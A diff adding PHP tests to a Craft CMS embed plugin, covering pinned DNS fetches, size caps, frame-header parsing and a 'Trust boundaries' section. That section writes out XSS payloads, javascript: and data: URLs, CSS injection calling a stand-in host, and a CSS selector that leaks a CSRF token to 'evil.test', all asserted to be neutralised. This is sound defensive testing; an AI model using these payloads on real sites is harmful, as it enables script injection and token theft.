@@ -203,6 +203,13 @@ check('a Spotify track is shorter than a Spotify album', function() use ($provid
         ?: "got {$track['height']} / {$album['height']}";
 });
 
+check('a CodePen team pen keeps its team path', function() use ($providers) {
+    $match = $providers->match('https://codepen.io/team/codepen/pen/PNaGbb');
+
+    return $match->provider->handle === 'codepen' && $match->embedUrl === 'https://codepen.io/team/codepen/embed/PNaGbb?default-tab=result'
+        ?: "got {$match->provider->handle} / {$match->embedUrl}";
+});
+
 check('a Google Doc becomes a preview, a Form becomes an embedded viewform', function() use ($providers) {
     $doc = $providers->match('https://docs.google.com/document/d/1AbC_def/edit');
     $form = $providers->match('https://docs.google.com/forms/d/e/1FAIpQL/viewform');
@@ -466,6 +473,77 @@ check('an unusual port is refused', function() use ($plugin) {
     return 'it fetched anyway';
 });
 
+// The pin is only as good as the handler that honours it. Guzzle's default stack hands a
+// streamed request to PHP's stream wrapper, which ignores CURLOPT_RESOLVE and looks the host up
+// again — so this substitutes the harness's own web server for example.com's address and asserts
+// that is where the connection went, asking for its robots.txt — a static file, so nginx answers
+// at once rather than queueing behind a full Craft render. No internet needed: an unpinned fetch fails or gets the
+// real example.com, and either way not this.
+$pinned = new class() extends \justinholtweb\eye\services\Fetcher {
+    protected function addressesFor(string $host): array
+    {
+        return ['127.0.0.1'];
+    }
+};
+
+check('the connection goes to the validated address, not a second lookup', function() use ($plugin, $pinned) {
+    $plugin->getSettings()->proxyEnabled = true;
+    $plugin->getSettings()->allowedHosts = ['example.com'];
+
+    try {
+        $result = $pinned->fetch('http://example.com/robots.txt', ['timeout' => 10]);
+    } catch (Throwable $e) {
+        return 'fetch failed: ' . $e->getMessage();
+    }
+
+    $local = file_get_contents(Craft::getAlias('@webroot/robots.txt'));
+
+    return $result->body === $local ?: 'reached somewhere other than the pinned address';
+});
+
+check('every validated address is offered to curl, IPv4 first', function() use ($plugin) {
+    // Separate CURLOPT_RESOLVE entries for one host replace each other, so only the last would
+    // survive — here an unroutable documentation address, and the fetch would fail.
+    $fetcher = new class() extends \justinholtweb\eye\services\Fetcher {
+        protected function addressesFor(string $host): array
+        {
+            return ['2001:db8::1', '127.0.0.1'];
+        }
+    };
+    $plugin->getSettings()->allowedHosts = ['example.com'];
+
+    try {
+        $result = $fetcher->fetch('http://example.com/robots.txt', ['timeout' => 10]);
+    } catch (Throwable $e) {
+        return 'fetch failed: ' . $e->getMessage();
+    }
+
+    return $result->status === 200 ?: "status $result->status";
+});
+
+check('a body over the size cap is abandoned as it arrives', function() use ($plugin, $pinned) {
+    $plugin->getSettings()->allowedHosts = ['example.com'];
+
+    try {
+        $pinned->fetch('http://example.com/', ['timeout' => 30, 'maxBytes' => 2048]);
+    } catch (Throwable $e) {
+        return str_contains($e->getMessage(), 'larger than') ?: 'wrong reason: ' . $e->getMessage();
+    }
+
+    return 'it fetched anyway';
+});
+
+check('a header probe returns the headers without the body', function() use ($pinned) {
+    try {
+        $result = $pinned->probe('http://example.com/robots.txt');
+    } catch (Throwable $e) {
+        return 'probe failed: ' . $e->getMessage();
+    }
+
+    return $result->status === 200 && $result->body === ''
+        ?: "got {$result->status} with " . strlen((string)$result->body) . ' bytes';
+});
+
 check('a redirect Location resolves against the URL it came from', function() use ($plugin) {
     $cases = [
         ['/about', 'https://example.com/docs/x.html', 'https://example.com/about'],
@@ -581,6 +659,12 @@ check('X-Frame-Options DENY is a refusal and SAMEORIGIN is a restriction', funct
 
     return $deny->status === FramabilityResult::STATUS_DENIED && $same->status === FramabilityResult::STATUS_RESTRICTED
         ?: "$deny->status / $same->status";
+});
+
+check('the non-standard X-Frame-Options ALLOWALL is read as embeddable', function() use ($plugin) {
+    $result = callPrivate($plugin->framability, 'judgeXfo', [new FramabilityResult(['url' => 'https://elsewhere.example/']), 'ALLOWALL']);
+
+    return $result->status === FramabilityResult::STATUS_ALLOWED ?: $result->status;
 });
 
 check('frame-ancestors is found among other directives and other policies', function() use ($plugin) {
@@ -1174,6 +1258,189 @@ check('a proxied document keeps a base pointing at the real origin', function() 
 });
 
 // -----------------------------------------------------------------------------
+section('Trust boundaries');
+
+$xss = '<img/src=x/onerror=alert(document.domain)>';
+
+check('a reference tag cannot carry fallback markup', function() use (&$embed, $xss) {
+    // Craft's ref-tag pattern allows everything but spaces, `}` and `|`, so this is writable by
+    // anyone who can type into rich text.
+    $parsed = Craft::$app->getElements()->parseRefs("{eye:{$embed->handle}:render(click,fallback=$xss)}");
+
+    return str_contains($parsed, 'eye-consent') && !str_contains($parsed, 'onerror')
+        ?: 'got ' . substr($parsed, 0, 400);
+});
+
+check('a reference tag cannot inject CSS, loosen the sandbox or add frame params', function() use (&$embed) {
+    $overrides = callPrivate($embed, 'parseRenderCall', ['render(height=500,injectCss=x,sandbox=,allow=camera,params=a=1,fallback=y,posterUrl=https://x/y.jpg)']);
+
+    return $overrides === ['height' => '500'] ?: 'got ' . json_encode($overrides);
+});
+
+check('a reference tag cannot turn a framed embed into a server-side fetch', function() use (&$embed) {
+    $parsed = Craft::$app->getElements()->parseRefs("{eye:{$embed->handle}:render(inline)}");
+
+    return str_contains($parsed, '<iframe') && !str_contains($parsed, 'eye--inline')
+        ?: 'got ' . substr($parsed, 0, 300);
+});
+
+check('fallback markup is purified, whoever wrote it', function() use ($plugin, $xss) {
+    $html = (string)$plugin->renderer->renderUrl('https://example.com/', EmbedOptions::fromArray([
+        'fallback' => "<p><b>Watch it on the site</b></p>$xss<script>alert(1)</script>",
+    ]));
+
+    return str_contains($html, '<b>Watch it on the site</b>') && !str_contains($html, 'onerror') && !str_contains($html, '<script>alert')
+        ?: 'got ' . substr($html, 0, 600);
+});
+
+check('a URL that is not http(s) renders nothing, inline or from a template', function() use ($plugin) {
+    $inline = InlineEmbed::fromValue(['url' => 'javascript:alert(1)']);
+
+    return (string)$plugin->renderer->renderUrl('javascript:alert(1)', new EmbedOptions()) === ''
+        && (string)$plugin->renderer->renderUrl('data:text/html,<script>alert(1)</script>', new EmbedOptions()) === ''
+        && (string)$inline->render() === ''
+        ?: 'a javascript: or data: URL was rendered';
+});
+
+check('a width cannot smuggle in other CSS declarations', function() {
+    $bad = EmbedOptions::fromArray(['width' => '10px;position:fixed;inset:0']);
+    $good = EmbedOptions::fromArray(['width' => 'min(100%, 720px)']);
+
+    return $bad->width === '100%' && $good->width === 'min(100%, 720px)' ?: "got {$bad->width} / {$good->width}";
+});
+
+check('a poster URL cannot leave its CSS url()', function() use ($plugin) {
+    $script = EmbedOptions::fromArray(['posterUrl' => 'javascript:alert(1)']);
+    $html = (string)$plugin->renderer->renderUrl('https://example.com/', EmbedOptions::fromArray([
+        'loading' => 'click',
+        'posterUrl' => 'https://example.com/a.jpg);background:url(https://evil.test/x',
+    ]));
+
+    return $script->posterUrl === '' && !str_contains($html, ');background') && str_contains($html, '%29%3Bbackground')
+        ?: 'got ' . (preg_match('/style="[^"]*"/', $html, $m) ? $m[0] : substr($html, 0, 300));
+});
+
+check('the Embed field keeps only the options it lets authors set', function() {
+    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeTrust', 'enabledOptions' => ['caption']]);
+    $value = $field->normalizeValueFromRequest([
+        'url' => 'https://example.com/',
+        'options' => ['caption' => 'Hello', 'fallback' => '<b>x</b>', 'injectCss' => 'body{}', 'mode' => 'inline', 'sandbox' => ''],
+    ], null);
+    $options = $value->getOptions();
+
+    return $options->caption === 'Hello' && $options->fallback === '' && $options->injectCss === '' && $options->mode !== 'inline'
+        ?: 'got ' . json_encode($options->toStorageArray());
+});
+
+check('CSS injected into a proxied page cannot close its <style>', function() use ($plugin) {
+    $options = EmbedOptions::fromArray(['injectCss' => 'p{color:red}</style><script>alert(1)</script>']);
+    $document = transform($plugin, '<html><head></head><body><p>x</p></body></html>', 'https://example.com/', $options);
+    $fragment = transformInline($plugin, '<html><body><p>x</p></body></html>', 'https://example.com/', $options);
+
+    return !str_contains($document, '<script>alert') && !str_contains($fragment, '<script>alert') && !str_contains($fragment, '</style><script')
+        ?: 'the style element was broken out of';
+});
+
+check('a JSON string posted to the Embed field is a URL, not a way round its options', function() {
+    $field = new \justinholtweb\eye\fields\EmbedField(['handle' => 'eyeTrust', 'enabledOptions' => ['caption']]);
+    $value = $field->normalizeValueFromRequest(json_encode([
+        'url' => 'https://example.com/',
+        'options' => ['allow' => 'camera microphone', 'mode' => 'inline', 'injectCss' => 'body{}'],
+    ]), null);
+    $options = $value->getOptions();
+
+    return $options->mode !== 'inline' && $options->injectCss === '' && !str_contains(json_encode($options->allow), 'camera')
+        ?: 'got ' . json_encode($options->toStorageArray());
+});
+
+check('inline CSS nested in an at-rule cannot reach the page around it', function() use ($plugin) {
+    $options = EmbedOptions::fromArray(['injectCss' => 'p{color:red} @media all{input[name=CRAFT_CSRF_TOKEN][value^=a]{background:url(//evil.test/a)}} @supports (x:y){@media all{a{b:c}}}']);
+    $fragment = transformInline($plugin, '<html><body><p>x</p></body></html>', 'https://example.com/', $options);
+
+    return !str_contains($fragment, 'CSRF') && !str_contains($fragment, 'evil.test') && str_contains($fragment, 'p{color:red}')
+        ?: 'got ' . substr($fragment, 0, 300);
+});
+
+check('an at-keyword spelled with an escape is removed too', function() use ($plugin) {
+    $css = '@\69mport url(https://evil.test/x.css); p{color:red}';
+    $stored = EmbedOptions::fromArray(['injectCss' => $css])->injectCss;
+    $fragment = transformInline($plugin, '<html><body><p>x</p></body></html>', 'https://example.com/', EmbedOptions::fromArray(['injectCss' => $css]));
+
+    return !str_contains($stored, 'evil.test') && !str_contains($fragment, 'evil.test') ?: "stored $stored";
+});
+
+check('a payload signed with the bare security key is not a proxy payload', function() {
+    $payload = base64_encode(json_encode(['v' => 2, 'url' => 'https://example.com/', 'o' => []]));
+    $signed = Craft::$app->getSecurity()->hashData($payload);
+
+    return Plugin::getInstance()->proxyRoutes->verify($signed) === null ?: 'it verified';
+});
+
+check('injected CSS cannot @import a stylesheet from elsewhere', function() {
+    return !str_contains(EmbedOptions::fromArray(['injectCss' => '@import url(https://evil.test/x.css); p{color:red}'])->injectCss, '@import');
+});
+
+check('a stripped proxied page loses every way of running script', function() use ($plugin) {
+    $html = '<html><body>'
+        . '<iframe src="javascript:alert(1)"></iframe>'
+        . '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'
+        . '<object data="https://example.com/x.swf"></object><embed src="https://example.com/x.swf">'
+        . '<a href=" jAvAsCrIpT:alert(1)">a</a><form action="javascript:alert(1)"></form>'
+        . '<a href="data:text/html,<script>alert(1)</script>">d</a>'
+        . '<img src="data:image/png;base64,AAAA" alt="kept">'
+        . '</body></html>';
+    $result = transform($plugin, $html, 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => true]));
+
+    return stripos($result, 'javascript:') === false
+        && !str_contains($result, 'srcdoc')
+        && !str_contains($result, '<object')
+        && !str_contains($result, '<embed')
+        && !str_contains($result, 'data:text/html')
+        && str_contains($result, 'data:image/png')
+        ?: 'got ' . substr($result, 0, 600);
+});
+
+check('removing a plugin element keeps the content after it', function() use ($plugin) {
+    $result = transform($plugin, '<html><body><embed src="https://example.com/x.swf"><p>After the embed</p><object data="x"><p>Object fallback</p></object></body></html>', 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => true]));
+
+    return str_contains($result, 'After the embed') && str_contains($result, 'Object fallback') && !str_contains($result, '<embed')
+        ?: 'got ' . substr($result, 0, 400);
+});
+
+check('a proxied page that keeps its scripts reports its own height', function() use ($plugin) {
+    $result = transform($plugin, '<html><head></head><body>x</body></html>', 'https://example.com/', EmbedOptions::fromArray(['stripScripts' => false]));
+    $html = (string)$plugin->renderer->renderUrl('https://example.com/page', EmbedOptions::fromArray(['mode' => 'proxy', 'stripScripts' => false]));
+    $config = Json::decode(html_entity_decode(preg_match('/data-eye="([^"]+)"/', $html, $m) ? $m[1] : '{}'));
+
+    return str_contains($result, "eye: 'height'") && ($config['auto']['sameOrigin'] ?? null) === false
+        ?: 'child script ' . (str_contains($result, "eye: 'height'") ? 'present' : 'missing') . ', config ' . json_encode($config['auto'] ?? null);
+});
+
+check('a stored embed’s proxy URL changes when its script handling does', function() use ($plugin) {
+    $uid = '00000000-0000-0000-0000-000000000001';
+    $stripped = $plugin->proxyRoutes->urlFor('https://example.com/', EmbedOptions::fromArray(['stripScripts' => true]), $uid);
+    $scripted = $plugin->proxyRoutes->urlFor('https://example.com/', EmbedOptions::fromArray(['stripScripts' => false]), $uid);
+
+    return $stripped !== $scripted && str_contains($stripped, "eye/proxy/$uid") ?: "got $stripped / $scripted";
+});
+
+check('a stripped proxied page is served in a sandbox that runs nothing', function() use ($plugin) {
+    $stripped = webResponse(fn() => callPrivate(new \justinholtweb\eye\controllers\ProxyController('proxy', $plugin), 'htmlResponse', ['<p>x</p>', EmbedOptions::fromArray(['stripScripts' => true])]));
+    $csp = (string)$stripped->getHeaders()->get('Content-Security-Policy');
+
+    return str_contains($csp, 'sandbox ') && !str_contains($csp, 'allow-scripts') && str_contains($csp, "script-src 'none'")
+        ?: "got $csp";
+});
+
+check('a proxied page that keeps its scripts loses this site’s origin', function() use ($plugin) {
+    $scripted = webResponse(fn() => callPrivate(new \justinholtweb\eye\controllers\ProxyController('proxy', $plugin), 'htmlResponse', ['<p>x</p>', EmbedOptions::fromArray(['stripScripts' => false])]));
+    $csp = (string)$scripted->getHeaders()->get('Content-Security-Policy');
+
+    return str_contains($csp, 'allow-scripts') && !str_contains($csp, 'allow-same-origin') && str_contains($csp, "frame-ancestors 'self'")
+        ?: "got $csp";
+});
+
+// -----------------------------------------------------------------------------
 section('Settings');
 
 check('a bad host name is rejected with an explanation', function() use ($plugin) {
@@ -1248,6 +1515,19 @@ function callPrivate(object $object, string $method, array $args): mixed
     $reflection->setAccessible(true);
 
     return $reflection->invokeArgs($object, $args);
+}
+
+/** Runs `$build` with a web response in place of the console one, and hands back what it built. */
+function webResponse(callable $build): mixed
+{
+    $console = Craft::$app->get('response');
+    Craft::$app->set('response', new craft\web\Response());
+
+    try {
+        return $build();
+    } finally {
+        Craft::$app->set('response', $console);
+    }
 }
 
 /** Runs the proxy's document transformation over a fixed string, with no network involved. */
